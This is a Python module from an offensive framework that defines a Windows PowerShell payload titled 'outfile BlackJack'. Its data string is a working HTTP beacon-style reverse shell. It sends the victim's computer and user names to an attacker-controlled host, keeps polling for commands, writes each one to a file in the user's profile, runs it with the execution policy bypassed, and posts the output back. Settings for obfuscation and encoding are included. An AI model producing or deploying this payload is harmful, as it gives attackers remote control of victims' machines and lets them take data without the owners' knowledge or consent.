# This module is part of the Blackjack framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell outfile BlackJack',
        'Author' : 'Rojahs Montari (r0jahsm0ntar1)',
        'Description' : 'An Http based beacon-like reverse shell that writes and executes commands from disc',
        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework', 'https://revshells.com']
    }

    meta = {
        'handler' : 'blackjack',
        'type' : 'ps-outfile',
        'os' : 'windows',
        'shell' : 'powershell.exe'
    }

    config = {
        'frequency' : 0.8,
        'outfile' : "C:\\Users\\$env:USERNAME\\.local\\africs.ps1"
    }

    parameters = {
        'lhost' : None
    }

    attrs = {
        'obfuscate' : True,
        'encode' : True
    }

    data = "$ConfirmPreference='None';$s='*LHOST*';$i='*SESSIONID*';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME -Headers @{\"*BLACKJACKID*\"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{\"*BLACKJACKID*\"=$i});if (!(@('None','quit') -contains $c)) {echo \"$c\" | out-file -filepath *OUTFILE*;$r=powershell -ep bypass *OUTFILE* -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/*POSTRES* -Method POST -Headers @{\"*BLACKJACKID*\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} elseif ($c -eq 'quit') {del *OUTFILE*;Stop-Process $PID} sleep *FREQ*}"
